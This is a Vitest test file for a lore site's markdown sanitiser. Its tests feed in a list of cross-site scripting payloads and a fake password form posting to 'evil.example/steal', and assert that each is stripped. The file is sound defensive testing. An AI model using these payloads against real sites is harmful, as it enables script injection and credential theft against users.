// @vitest-environment jsdom
import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { renderLore } from "~/lib/markdown";

describe("renderLore", () => {
  it("renders footnotes from the exported timelines", () => {
    const html = renderLore(readFileSync("lore/History of Hurley (Catholic Lore).md", "utf8"));
    expect(html).toContain('class="footnote-ref"');
    expect(html).toContain('class="footnotes"');
  });

  it("renders GFM tables", () => {
    const html = renderLore(readFileSync("lore/Greater Dragons.md", "utf8"), "Greater Dragons");
    expect(html).toContain("<table>");
    expect(html).toContain("Cryomelle");
    // The title heading is shown by the page, not repeated in the body.
    expect(html).not.toContain("<h1");
  });

  it("gives headings the ids the table of contents links to", () => {
    const html = renderLore(readFileSync("lore/Chione_ Volume 1_ The Child of Destiney.md", "utf8"));
    expect(html).toContain('href="#book-one-the-child-of-prophecy"');
    expect(html).toContain('id="book-one-the-child-of-prophecy"');
  });

  it("strips scripts and event handlers", () => {
    const html = renderLore('Hello <img src=x onerror="alert(1)"><script>alert(2)</script> <u>world</u>');
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("<script");
    expect(html).toContain("<u>world</u>");
  });

  it("opens external links in a new tab", () => {
    const html = renderLore("[Dragons](https://example.com) and [a section](#top)");
    expect(html).toContain('href="https://example.com" target="_blank" rel="noopener noreferrer"');
    expect(html).toMatch(/<a href="#top">a section<\/a>/);
  });

  it("never lets script through", () => {
    const attempts = [
      "[x](javascript:alert(1))",
      "[x][1]\n\n[1]: javascript:alert(1)",
      "![x](javascript:alert(1))",
      "Text[^1]\n\n[^1]: <img src=x onerror=alert(1)>",
      "## <img src=x onerror=alert(1)> Heading",
      "| a |\n|---|\n| <img src=x onerror=alert(1)> |",
      '<a href="javascript:alert(1)">x</a>',
      '<a href="&#106;avascript:alert(1)">x</a>',
      '<a href="data:text/html,<script>alert(1)</script>">x</a>',
      '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
      "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
      '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
      '<object data="javascript:alert(1)"></object>',
      '<base href="javascript:alert(1)//">',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      "<details open ontoggle=alert(1)>x</details>",
      "<!--><img src=x onerror=alert(1)>-->",
    ];
    for (const attempt of attempts) {
      const doc = new DOMParser().parseFromString(renderLore(attempt), "text/html");
      for (const el of doc.body.querySelectorAll("*")) {
        expect(["script", "iframe", "object", "embed", "base", "meta", "svg", "math"]).not.toContain(el.localName);
        for (const attr of el.attributes) {
          expect(attr.name).not.toMatch(/^on/);
          expect(attr.value.replace(/\s/g, "")).not.toMatch(/^(javascript|data:text)/i);
        }
      }
    }
  });

  it("keeps stylesheets and forms out of lore", () => {
    const html = renderLore(
      [
        "Words <style>body { display: none }</style> more words",
        '<form action="https://evil.example/steal" method="post"><input name="password" type="password"><button>Sign in</button></form>',
        "<textarea>typed</textarea><select><option>one</option></select>",
        "<dialog open>a box</dialog>",
      ].join("\n\n")
    );
    expect(html).not.toMatch(/<(style|form|input|button|textarea|select|option|dialog)\b/);
    expect(html).not.toContain("evil.example");
    expect(html).not.toContain("display: none");
    expect(html).toContain("Sign in");
  });

  it("lets a style attribute size and align its box, and nothing else", () => {
    const widths = renderLore(readFileSync("lore/The Phantosian V. 1.md", "utf8"));
    expect(widths).toContain('<col style="width: 12%">');
    expect(widths).toContain('style="text-align: center"');

    expect(renderLore('<table><tr><th style="text-align: center; position: fixed">A</th></tr></table>')).toContain(
      '<th style="text-align: center">A</th>'
    );
    expect(renderLore("| a |\n|--:|\n| b |")).toContain('<td style="text-align: right">b</td>');
    expect(renderLore('<div style="position:fixed;inset:0;z-index:9999">over the page</div>')).toBe(
      "<div>over the page</div>"
    );
    expect(renderLore('<p style="background: url(https://evil.example/x.png)">x</p>')).toBe("<p>x</p>");
  });

  it("keeps the markdown plugins' classes and none of the site's", () => {
    expect(renderLore('<div class="fixed inset-0 z-50 footnotes">x</div>')).toBe('<div class="footnotes">x</div>');
    expect(renderLore('<a class="btn btn-gold" href="#top">x</a>')).toContain('<a href="#top">x</a>');
    expect(renderLore("```js\nlet a = 1;\n```")).toContain('<code class="language-js">');
    expect(renderLore('<div data-frame="map" data-attribute="fire">x</div>')).toBe("<div>x</div>");
  });
});
